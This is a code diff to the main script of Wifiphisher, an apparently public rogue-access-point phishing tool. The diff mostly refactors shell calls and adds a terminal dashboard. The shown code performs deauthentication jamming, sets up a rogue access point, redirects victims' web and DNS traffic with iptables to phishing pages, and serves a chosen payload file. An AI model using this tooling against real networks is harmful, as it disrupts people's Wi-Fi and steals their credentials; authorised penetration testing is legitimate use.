@@ -1,6 +1,7 @@
 #!/usr/bin/env python2
 # -*- coding: utf-8 -*-
 
+import subprocess
 import os
 import string
 import re
@@ -9,6 +10,7 @@ import sys
 import argparse
 import fcntl
 import pickle
+from blessings import Terminal
 from threading import Thread, Lock
 from subprocess import Popen, PIPE, check_output
 import logging
@@ -24,7 +26,7 @@ from constants import *
 VERSION = "1.2GIT"
 conf.verb = 0
 count = 0  # for channel hopping Thread
-APs = {} # for listing APs
+APs = {}  # for listing APs
 clients_APs = []
 hop_daemon_running = True
 sniff_daemon_running = True
@@ -34,6 +36,7 @@ lock = Lock()
 args = 0
 mon_MAC = 0
 first_pass = 1
+
 
 def parse_args():
     # Create the arguments
@@ -91,20 +94,20 @@ def parse_args():
         "-e",
         "--essid",
         help=("Enter the ESSID of the rogue Access Point. " +
-             "This option will skip Access Point selection phase. " +
-             "Example: --essid 'Free WiFi'"
-             )
+              "This option will skip Access Point selection phase. " +
+              "Example: --essid 'Free WiFi'"
+              )
     )
     parser.add_argument(
         "-p",
         "--phishingscenario",
-        help=("Choose the phishing scenario to run."+
+        help=("Choose the phishing scenario to run." +
               "This option will skip the scenario selection phase. " +
               "Example: -p firmware_upgrade"))
     parser.add_argument(
         "-pK",
         "--presharedkey",
-        help=("Add WPA/WPA2 protection on the rogue Access Point. " + 
+        help=("Add WPA/WPA2 protection on the rogue Access Point. " +
               "Example: -pK s3cr3tp4ssw0rd"))
     parser.add_argument(
         "-qS",
@@ -115,29 +118,33 @@ def parse_args():
 
     return parser.parse_args()
 
+
 def check_args(args):
     """
     Checks the given arguments for logic errors.
     """
 
     if args.presharedkey and \
-    (len(args.presharedkey) < 8 \
-    or len(args.presharedkey) > 64):
-        sys.exit('[' + R + '-' + W + '] Pre-shared key must be between 8 and 63 printable characters.')
+        (len(args.presharedkey) < 8
+         or len(args.presharedkey) > 64):
+        sys.exit(
+            '[' + R + '-' + W + '] Pre-shared key must be between 8 and 63 printable characters.')
 
-    if ((args.jamminginterface and not args.apinterface) or \
-    (not args.jamminginterface and args.apinterface)) and \
-    not (args.nojamming and args.apinterface):
+    if ((args.jamminginterface and not args.apinterface) or
+            (not args.jamminginterface and args.apinterface)) and \
+            not (args.nojamming and args.apinterface):
         sys.exit('[' + R + '-' + W + '] --apinterface (-aI) and --jamminginterface (-jI) (or --nojamming (-nJ)) are used in conjuction.')
 
-    if args.nojamming and args.jamminginterface: 
-        sys.exit('[' + R + '-' + W + '] --nojamming (-nJ) and --jamminginterface (-jI) cannot work together.')
+    if args.nojamming and args.jamminginterface:
+        sys.exit(
+            '[' + R + '-' + W + '] --nojamming (-nJ) and --jamminginterface (-jI) cannot work together.')
 
 
 def stopfilter(x):
     if not sniff_daemon_running:
         return True
     return False
+
 
 def shutdown(template=None, network_manager=None):
     """
@@ -147,13 +154,13 @@ def shutdown(template=None, network_manager=None):
     jamming_daemon_running = False
     sniff_daemon_running = False
 
-    os.system('iptables -F')
-    os.system('iptables -X')
-    os.system('iptables -t nat -F')
-    os.system('iptables -t nat -X')
-    os.system('pkill airbase-ng')
-    os.system('pkill dnsmasq')
-    os.system('pkill hostapd')
+    subprocess.call('iptables -F', shell=True)
+    subprocess.call('iptables -X', shell=True)
+    subprocess.call('iptables -t nat -F', shell=True)
+    subprocess.call('iptables -t nat -X', shell=True)
+    subprocess.call('pkill airbase-ng', shell=True)
+    subprocess.call('pkill dnsmasq', shell=True)
+    subprocess.call('pkill hostapd', shell=True)
 
     if os.path.isfile('/tmp/wifiphisher-webserver.tmp'):
         os.remove('/tmp/wifiphisher-webserver.tmp')
@@ -167,7 +174,7 @@ def shutdown(template=None, network_manager=None):
         try:
             network_manager.reset_ifaces_to_managed()
         except:
-            print '[' + R + '!' + W + '] Failed to reset interface' 
+            print '[' + R + '!' + W + '] Failed to reset interface'
 
     # Remove any template extra files
     if template:
@@ -181,22 +188,22 @@ def set_fw_rules():
     """
     Set iptable rules
     """
-    os.system(
+    subprocess.call(
         ('iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination %s:%s'
-         % (NETWORK_GW_IP, PORT))
-    )
-    os.system(
+         % (NETWORK_GW_IP, PORT)),
+        shell=True)
+    subprocess.call(
         ('iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to-destination %s:%s'
-         % (NETWORK_GW_IP, 53))
-    )
-    os.system(
+         % (NETWORK_GW_IP, 53)),
+        shell=True)
+    subprocess.call(
         ('iptables -t nat -A PREROUTING -p tcp --dport 53 -j DNAT --to-destination %s:%s'
-         % (NETWORK_GW_IP, 53))
-    )
-    os.system(
+         % (NETWORK_GW_IP, 53)),
+        shell=True)
+    subprocess.call(
         ('iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination %s:%s'
-         % (NETWORK_GW_IP, SSL_PORT))
-    )
+         % (NETWORK_GW_IP, SSL_PORT)),
+        shell=True)
 
 
 def set_kernel_var():
@@ -228,8 +235,8 @@ def sniffing(interface, cb):
     '''This exists for if/when I get deauth working
     so that it's easy to call sniff() in a thread'''
     try:
-        sniff(iface=interface, prn=cb, stop_filter=stopfilter, \
-        store=False, lfilter=lambda p: (Dot11Beacon in p or Dot11ProbeResp in p))
+        sniff(iface=interface, prn=cb, stop_filter=stopfilter,
+              store=False, lfilter=lambda p: (Dot11Beacon in p or Dot11ProbeResp in p))
     except socket.error as e:
         # Network is down
         if e.errno == 100:
@@ -250,13 +257,17 @@ def targeting_cb(pkt):
     crypto = set()
     while isinstance(p, Dot11Elt):
         if p.ID == 0:
-            try: p.info.decode('utf8')
-            except UnicodeDecodeError: essid = "<contains non-printable chars>"
-            else: essid = p.info
+            try:
+                p.info.decode('utf8')
+            except UnicodeDecodeError:
+                essid = "<contains non-printable chars>"
+            else:
+                essid = p.info
         elif p.ID == 3:
             try:
                 channel = str(ord(p.info))
-            # TypeError: ord() expected a character, but string of length 2 found
+            # TypeError: ord() expected a character, but string of length 2
+            # found
             except Exception:
                 return
         elif p.ID == 48:
@@ -281,14 +292,14 @@ def targeting_cb(pkt):
 
 def target_APs():
     global APs, count, mac_matcher
-    os.system('clear')
+    subprocess.call('clear', shell=True)
     print ('[' + G + '+' + W + '] Ctrl-C at any time to copy an access' +
            ' point from below')
 
     max_name_size = max(map(lambda ap: len(ap[1]), APs.itervalues()))
 
     header = ('{0:3}  {1:3}  {2:{width}}   {3:19}  {4:14}  {5:}'
-        .format('num', 'ch', 'ESSID', 'BSSID', 'encr', 'vendor', width=max_name_size + 1))
+              .format('num', 'ch', 'ESSID', 'BSSID', 'encr', 'vendor', width=max_name_size + 1))
 
     print header
     print '-' * len(header)
@@ -300,16 +311,16 @@ def target_APs():
         vendor = mac_matcher.get_vendor_name(mac)
 
         print ((G + '{0:2}' + W + ' - {1:2}  - ' +
-               T + '{2:{width}} ' + W + ' - ' +
-               B + '{3:17}' + W + ' - {4:12} - ' + 
-               R + ' {5:}' + W
-            ).format(ap,
-                    APs[ap][0],
-                    APs[ap][1],
-                    mac,
-                    crypto,
-                    vendor,
-                    width=max_name_size))
+                T + '{2:{width}} ' + W + ' - ' +
+                B + '{3:17}' + W + ' - {4:12} - ' +
+                R + ' {5:}' + W
+                ).format(ap,
+                         APs[ap][0],
+                         APs[ap][1],
+                         mac,
+                         crypto,
+                         vendor,
+                         width=max_name_size))
 
 
 def copy_AP():
@@ -377,7 +388,7 @@ def select_template(template_argument):
         # loop until all operations for template selection is done
         while True:
             # clear the screen
-            os.system('clear')
+            subprocess.call('clear', shell=True)
 
             # display template header
             print "\nAvailable Phishing Scenarios:\n"
@@ -433,11 +444,12 @@ def start_ap(mon_iface, channel, essid, args):
         ) % args.presharedkey
 
     with open('/tmp/hostapd.conf', 'w') as dhcpconf:
-            dhcpconf.write(config % (mon_iface, essid, channel))
+        dhcpconf.write(config % (mon_iface, essid, channel))
 
-    hostapd_proc = Popen(['hostapd', '/tmp/hostapd.conf'], stdout=DN, stderr=DN)
+    hostapd_proc = Popen(['hostapd', '/tmp/hostapd.conf'],
+                         stdout=DN, stderr=DN)
     try:
-        time.sleep(6)  # Copied from Pwnstar which said it was necessary?
+        time.sleep(2)
         if hostapd_proc.poll() != None:
             # hostapd will exit on error
             print('[' + R + '+' + W +
@@ -480,10 +492,10 @@ def dhcp(dhcpconf, mon_iface):
     proc = check_output(['ifconfig', str(mon_iface)])
     if NETWORK_GW_IP not in proc:
         return False
-    os.system(
+    subprocess.call(
         ('route add -net %s netmask %s gw %s' %
-         (NETWORK_IP, NETWORK_MASK, NETWORK_GW_IP))
-    )
+         (NETWORK_IP, NETWORK_MASK, NETWORK_GW_IP)),
+        shell=True)
     return True
 
 
@@ -578,7 +590,8 @@ def deauth(monchannel):
             args.deauthpackets = 1
 
         for p in pkts:
-            send(p, inter=float(args.timeinterval), count=int(args.deauthpackets))
+            send(p, inter=float(args.timeinterval),
+                 count=int(args.deauthpackets))
 
 
 def output(monchannel):
@@ -748,6 +761,7 @@ def sniff_dot11(mon_iface):
         else:
             raise
 
+
 def kill_interfering_procs():
     # Kill any possible programs that may interfere with the wireless card
     # For systems with airmon-ng installed
@@ -769,10 +783,11 @@ def kill_interfering_procs():
 
         time.sleep(1)
 
+
 def run():
 
-    print ('[' + T + '*' + W + '] Starting Wifiphisher %s at %s' % \
-          (VERSION, time.strftime("%Y-%m-%d %H:%M")))
+    print ('[' + T + '*' + W + '] Starting Wifiphisher %s at %s' %
+           (VERSION, time.strftime("%Y-%m-%d %H:%M")))
 
     # Parse args
     global args, APs, clients_APs, mon_MAC, mac_matcher, hop_daemon_running
@@ -798,24 +813,26 @@ def run():
     try:
         if not args.nojamming:
             if args.jamminginterface and args.apinterface:
-                mon_iface = network_manager.get_jam_iface(args.jamminginterface)
+                mon_iface = network_manager.get_jam_iface(
+                    args.jamminginterface)
                 ap_iface = network_manager.get_ap_iface(args.apinterface)
             else:
                 mon_iface, ap_iface = network_manager.find_interface_automatically()
             network_manager.set_jam_iface(mon_iface.get_name())
             network_manager.set_ap_iface(ap_iface.get_name())
             # display selected interfaces to the user
-            print ("[{0}+{1}] Selecting {0}{2}{1} interface for the deauthentication "\
-                   "attack\n[{0}+{1}] Selecting {0}{3}{1} interface for creating the "\
+            print ("[{0}+{1}] Selecting {0}{2}{1} interface for the deauthentication "
+                   "attack\n[{0}+{1}] Selecting {0}{3}{1} interface for creating the "
                    "rogue Access Point").format(G, W, mon_iface.get_name(), ap_iface.get_name())
         else:
             if args.apinterface:
-                ap_iface = network_manager.get_ap_iface(interface_name=args.apinterface)
+                ap_iface = network_manager.get_ap_iface(
+                    interface_name=args.apinterface)
             else:
                 ap_iface = network_manager.get_ap_iface()
             mon_iface = ap_iface
             network_manager.set_ap_iface(ap_iface.get_name())
-            print ("[{0}+{1}] Selecting {0}{2}{1} interface for creating the "\
+            print ("[{0}+{1}] Selecting {0}{2}{1} interface for creating the "
                    "rogue Access Point").format(G, W, ap_iface.get_name())
 
         kill_interfering_procs()
@@ -874,15 +891,16 @@ def run():
             if not os.path.isfile(payload_path):
                 print '[' + R + '-' + W + '] Invalid file path!'
         print '[' + T + '*' + W + '] Using ' + G + payload_path + W + ' as payload '
-        copyfile(payload_path, PHISHING_PAGES_DIR + template.get_payload_path())
+        copyfile(payload_path, PHISHING_PAGES_DIR +
+                 template.get_payload_path())
 
     APs_context = []
     for i in APs:
         APs_context.append({
-            'channel': APs[i][0],
-            'essid': APs[i][1],
-            'bssid': APs[i][2],
-            'vendor': mac_matcher.get_vendor_name(APs[i][2])
+            'channel': APs[i][0] or "",
+            'essid': APs[i][1] or "",
+            'bssid': APs[i][2] or "",
+            'vendor': mac_matcher.get_vendor_name(APs[i][2]) or ""
         })
 
     template.merge_context({'APs': APs_context})
@@ -890,15 +908,13 @@ def run():
     ap_logo_path = template.use_file(mac_matcher.get_vendor_logo_path(ap_mac))
 
     template.merge_context({
-        'target_ap_channel': args.channel,
-        'target_ap_essid': essid,
-        'target_ap_bssid': ap_mac,
-        'target_ap_encryption': enctype,
-        'target_ap_vendor': mac_matcher.get_vendor_name(ap_mac),
-        'target_ap_logo_path': ap_logo_path 
+        'target_ap_channel': args.channel or "",
+        'target_ap_essid': essid or "",
+        'target_ap_bssid': ap_mac or "",
+        'target_ap_encryption': enctype or "",
+        'target_ap_vendor': mac_matcher.get_vendor_name(ap_mac) or "",
+        'target_ap_logo_path': ap_logo_path or ""
     })
-
-    phishinghttp.serve_template(template)
 
     # We want to set this now for hostapd. Maybe the interface was in "monitor"
     # mode for network discovery before (e.g. when --nojamming is enabled).
@@ -911,7 +927,7 @@ def run():
               '] Could not set IP address on %s!' % ap_iface.get_name()
               )
         shutdown(template)
-    os.system('clear')
+    subprocess.call('clear', shell=True)
     print ('[' + T + '*' + W + '] ' + T +
            essid + W + ' set up on channel ' +
            T + channel + W + ' via ' + T + mon_iface.get_name() +
@@ -919,38 +935,13 @@ def run():
 
     # With configured DHCP, we may now start the web server
     # Start HTTP server in a background thread
-    Handler = phishinghttp.HTTPRequestHandler
-    try:
-        httpd = phishinghttp.HTTPServer((NETWORK_GW_IP, PORT), Handler)
-    except socket.error, v:
-        errno = v[0]
-        sys.exit((
-            '\n[' + R + '-' + W + '] Unable to start HTTP server (socket errno ' + str(errno) + ')!\n' +
-            '[' + R + '-' + W + '] Maybe another process is running on port ' + str(PORT) + '?\n' +
-            '[' + R + '!' + W + '] Closing'
-        ))
-    print '[' + T + '*' + W + '] Starting HTTP server at port ' + str(PORT)
-    webserver = Thread(target=httpd.serve_forever)
+    print '[' + T + '*' + W + '] Starting HTTP/HTTPS server at ports ' + str(PORT) + ", " + str(SSL_PORT)
+    webserver = Thread(target=phishinghttp.runHTTPServer,
+                       args=(NETWORK_GW_IP, PORT, SSL_PORT, template))
     webserver.daemon = True
     webserver.start()
-    # Start HTTPS server in a background thread
-    Handler = phishinghttp.SecureHTTPRequestHandler
-    try:
-        httpd = phishinghttp.SecureHTTPServer((NETWORK_GW_IP, SSL_PORT), Handler)
-    except socket.error, v:
-        errno = v[0]
-        sys.exit((
-            '\n[' + R + '-' + W + '] Unable to start HTTPS server (socket errno ' + str(errno) + ')!\n' +
-            '[' + R + '-' + W + '] Maybe another process is running on port ' + str(SSL_PORT) + '?\n' +
-            '[' + R + '!' + W + '] Closing'
-        ))
-    print ('[' + T + '*' + W + '] Starting HTTPS server at port ' +
-           str(SSL_PORT))
-    secure_webserver = Thread(target=httpd.serve_forever)
-    secure_webserver.daemon = True
-    secure_webserver.start()
 
-    time.sleep(3)
+    time.sleep(1.5)
 
     # We no longer need mac_matcher
     mac_matcher.unbind()
@@ -975,32 +966,30 @@ def run():
 
     # Main loop.
     try:
-        while 1:
-            os.system("clear")
-            print "Jamming devices: "
-            if os.path.isfile('/tmp/wifiphisher-jammer.tmp'):
-                proc = check_output(['cat', '/tmp/wifiphisher-jammer.tmp'])
-                lines = proc + "\n" * (LINES_OUTPUT - len(proc.split('\n')))
-            else:
-                lines = "\n" * LINES_OUTPUT
-            print lines
-            print "DHCP Leases: "
-            if os.path.isfile('/var/lib/misc/dnsmasq.leases'):
-                proc = check_output(['cat', '/var/lib/misc/dnsmasq.leases'])
-                lines = proc + "\n" * (LINES_OUTPUT - len(proc.split('\n')))
-            else:
-                lines = "\n" * LINES_OUTPUT
-            print lines
-            print "HTTP requests: "
-            if os.path.isfile('/tmp/wifiphisher-webserver.tmp'):
-                proc = check_output(['cat', '/tmp/wifiphisher-webserver.tmp'])
-                lines = proc + "\n" * (LINES_OUTPUT - len(proc.split('\n')))
-            else:
-                lines = "\n" * LINES_OUTPUT
-            print lines
-            if phishinghttp.terminate and args.quitonsuccess:
-                time.sleep(3)
-                shutdown(template, network_manager)
-            time.sleep(0.5)
+        term = Terminal()
+        with term.fullscreen():
+            while 1:
+                term.clear()
+                with term.hidden_cursor():
+                    print term.move(0, term.width - 30) + "|"
+                    print term.move(1, term.width - 30) + "|" + " " + term.bold_blue("Wifiphisher " + VERSION)
+                    print term.move(2, term.width - 30) + "|" + " ESSID: " + essid
+                    print term.move(3, term.width - 30) + "|" + " Channel: " + channel
+                    print term.move(4, term.width - 30) + "|" + " AP interface: " + mon_iface.get_name() 
+                    print term.move(5, term.width - 30) + "|" + "_"*29 
+                    print term.move(1,0) + term.blue("Jamming devices: ")
+                    if os.path.isfile('/tmp/wifiphisher-jammer.tmp'):
+                        proc = check_output(['tail', '-5', '/tmp/wifiphisher-jammer.tmp'])
+                        print term.move(4,0) + proc 
+                    print term.move(9,0) + term.blue("DHCP Leases: ")
+                    if os.path.isfile('/var/lib/misc/dnsmasq.leases'):
+                        proc = check_output(['tail', '-5', '/var/lib/misc/dnsmasq.leases'])
+                        print term.move(10,0) + proc
+                    print term.move(17,0) + term.blue("HTTP requests: ")
+                    if os.path.isfile('/tmp/wifiphisher-webserver.tmp'):
+                        proc = check_output(['tail', '-5', '/tmp/wifiphisher-webserver.tmp'])
+                        print term.move(18,0) + proc
+                    if phishinghttp.terminate and args.quitonsuccess:
+                        shutdown(template, network_manager)
     except KeyboardInterrupt:
         shutdown(template, network_manager)
